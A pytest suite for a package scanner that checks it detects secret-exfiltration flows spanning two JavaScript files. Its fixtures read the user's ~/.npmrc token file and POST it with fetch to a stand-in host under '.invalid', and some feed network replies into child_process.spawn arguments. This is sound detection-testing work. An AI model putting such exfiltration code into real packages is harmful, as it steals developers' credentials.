"""Item 60 wired into the scan: a value one of a package's files reads and a helper another file
exports sends is one flow, reported at the caller's line through the same rules as a flow in one file
(notes/60-cross-file-flow.md, "Wiring into the scan").

Fixtures name hosts under `.invalid`; nothing in them is run.
"""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.engine.isolation.facts import Facts
from cordon_scanner.foundation.config.settings import Config


class CrossScanKit:
    CALLER: ClassVar[str] = (
        'const fs = require("fs");\n'
        'const os = require("os");\n'
        'const { send } = require("./lib/send");\n'
        'const secret = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");\n'
        "send(secret);\n"
    )
    SENDER: ClassVar[str] = (
        "module.exports.send = function (d) {\n"
        '  return fetch("https://a.invalid/u", { method: "POST", body: d });\n'
        "};\n"
    )
    ONE_FILE: ClassVar[str] = (
        'const fs = require("fs");\n'
        'const os = require("os");\n'
        "function send(d) {\n"
        '  return fetch("https://a.invalid/u", { method: "POST", body: d });\n'
        "}\n"
        'const secret = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");\n'
        "send(secret);\n"
    )

    @staticmethod
    def package(root, files: dict[str, str]):
        root.mkdir(parents=True)
        (root / "package.json").write_text(
            '{"name":"cross-demo","version":"1.0.0","main":"index.js"}', encoding="utf-8"
        )
        for name, text in files.items():
            (root / name).parent.mkdir(parents=True, exist_ok=True)
            (root / name).write_text(text, encoding="utf-8")
        return root

    FLOW: ClassVar[str] = "SUSPECT.EXFIL.FLOW_SECRET.001"

    @staticmethod
    def flows_at(result, path: str) -> set[tuple[str, int | None]]:
        """The flow findings at `path`: (rule, line)."""
        return {
            (f.rule_id, f.location.line)
            for f in result.findings
            if f.detector == "capability" and f.location.path == path and ".FLOW_" in f.rule_id
        }

    @staticmethod
    def scan(root):
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(root)


class TestAHelperInAnotherFile:
    def test_the_secret_sent_by_a_helper_is_the_one_file_flow(self, tmp_path) -> None:
        one = CrossScanKit.scan(
            CrossScanKit.package(tmp_path / "one", {"index.js": CrossScanKit.ONE_FILE})
        )
        split = CrossScanKit.scan(
            CrossScanKit.package(
                tmp_path / "split",
                {"index.js": CrossScanKit.CALLER, "lib/send.js": CrossScanKit.SENDER},
            )
        )
        assert {rule for rule, _ in CrossScanKit.flows_at(one, "index.js")} == {CrossScanKit.FLOW}
        # At the caller's line: the call that hands the secret to the helper.
        assert CrossScanKit.flows_at(split, "index.js") == {(CrossScanKit.FLOW, 5)}
        assert not CrossScanKit.flows_at(split, "lib/send.js")

    def test_reported_once_when_the_file_has_the_flow_itself(self, tmp_path) -> None:
        # The same secret sent by a local helper and by another file's, on one line.
        both = CrossScanKit.ONE_FILE.replace(
            "send(secret);\n", 'send(secret); require("./lib/send").send(secret);\n'
        )
        result = CrossScanKit.scan(
            CrossScanKit.package(
                tmp_path / "p", {"index.js": both, "lib/send.js": CrossScanKit.SENDER}
            )
        )
        assert {rule for rule, _ in CrossScanKit.flows_at(result, "index.js")} == {
            CrossScanKit.FLOW
        }
        found = [f for f in result.findings if f.rule_id == CrossScanKit.FLOW]
        assert len(found) == 1

    def test_no_helper_no_flow(self, tmp_path) -> None:
        quiet = "module.exports.send = function (d) { return d.length; };\n"
        result = CrossScanKit.scan(
            CrossScanKit.package(
                tmp_path / "p", {"index.js": CrossScanKit.CALLER, "lib/send.js": quiet}
            )
        )
        assert not CrossScanKit.flows_at(result, "index.js")

    def test_a_dynamic_require_gives_no_flow(self, tmp_path) -> None:
        caller = CrossScanKit.CALLER.replace(
            'require("./lib/send")', 'require("./lib/" + process.argv[2])'
        )
        result = CrossScanKit.scan(
            CrossScanKit.package(
                tmp_path / "p", {"index.js": caller, "lib/send.js": CrossScanKit.SENDER}
            )
        )
        assert not CrossScanKit.flows_at(result, "index.js")


class TestAsTheSameFileJudgesIt:
    """Note 60 rule 5: a helper in another file is judged as the same helper written in place. The
    pair of 3 Nov found a data argument (note 69) read as code across files only."""

    CALLER: ClassVar[str] = (
        'const { k } = require("./kill");\n'
        "(async () => {\n"
        '  const r = await fetch("https://api.invalid/latest");\n'
        "  k(await r.text());\n"
        "})();\n"
    )

    @staticmethod
    def remote(helper: str) -> bool:
        from cordon_scanner.analysis.javascript.flow.summaries import CrossFile
        from cordon_scanner.analysis.javascript.js_flow import JsFlow

        files = {"index.js": TestAsTheSameFileJudgesIt.CALLER, "kill.js": helper}
        facts = {p: JsFlow.summaries(x) for p, x in files.items()}
        return any(
            "network_response" in f[2] and f[3] == "process"
            for f in CrossFile.compose(facts, frozenset(files))
        )

    def test_a_reply_as_a_data_argument_is_no_flow(self) -> None:
        helper = 'const cp = require("child_process");\nmodule.exports.k = (v) => cp.spawn("taskkill", ["/pid", v, "/t", "/f"]);\n'
        assert not self.remote(helper)

    def test_a_reply_as_an_argument_that_is_code_is_a_flow(self) -> None:
        helper = 'const cp = require("child_process");\nmodule.exports.k = (v) => cp.spawn("git", [v]);\n'
        assert self.remote(helper)

    def test_a_reply_into_a_local_row_stays_a_flow(self) -> None:
        helper = 'const cp = require("child_process");\nmodule.exports.k = (v) => cp.spawn("ffmpeg", ["-i", v]);\n'
        assert self.remote(helper)


class TestTheChannel:
    """The summaries cross as declared facts: anything else refuses the file's set (a gap)."""

    @pytest.mark.parametrize(
        "kind, value",
        [
            ("js.summary", ["send", "P0", "sink:request:evil.invalid"]),
            ("js.summary", ["send", "os.system", "return"]),
            ("js.callout", ["./x", "f", 0, ["P99"], 1, "", "C1"]),
            ("js.callout", ["./x", "f", 9, [], 1, "", "C1"]),
            ("js.callsink", ["P0", "request", "fixed", 1]),
            ("js.export", ["", 0]),
            ("js.reexport", [""]),
        ],
    )
    def test_a_wrong_shape_is_refused(self, kind, value) -> None:
        import json

        accepted, why = Facts.accept(json.dumps({kind: [value]}), 0)
        assert accepted is None
        assert kind in why

    def test_the_summaries_of_a_real_pair_are_accepted(self) -> None:
        import json

        from cordon_scanner.analysis.javascript.js_flow import JsFlow

        for text in (CrossScanKit.CALLER, CrossScanKit.SENDER):
            facts = JsFlow.summaries(text)
            assert facts
            accepted, why = Facts.accept(json.dumps(facts), 0)
            assert accepted is not None, why

    @pytest.mark.parametrize(
        "text",
        [
            'const h = require("../..");\nh.go(process.env.X);\nh(1);\n',
            'const h = require(".");\nh.go(1);\nrequire("./")(2);\n',
            'const { go } = require("../../lib");\ngo(1);\n',
            'const h = require("./lib.v2");\nh.run(1);\n',
        ],
    )
    def test_a_relative_path_of_dots_is_accepted(self, text) -> None:
        # zcash-easy-miner's examples call `require("../..")`: its dots were read as a member, an empty
        # export name was sent, and the file's facts were refused, a gap (the pair, 3 Nov).
        import json

        from cordon_scanner.analysis.javascript.js_flow import JsFlow

        facts = JsFlow.summaries(text)
        accepted, why = Facts.accept(json.dumps(facts), 0)
        assert accepted is not None, why
        assert all(c[1] for c in facts.get("js.callout", ()))

    def test_a_file_joining_nothing_sends_nothing(self) -> None:
        from cordon_scanner.analysis.javascript.js_flow import JsFlow

        assert JsFlow.summaries("const x = 1;\nconsole.log(x);\n") == {}
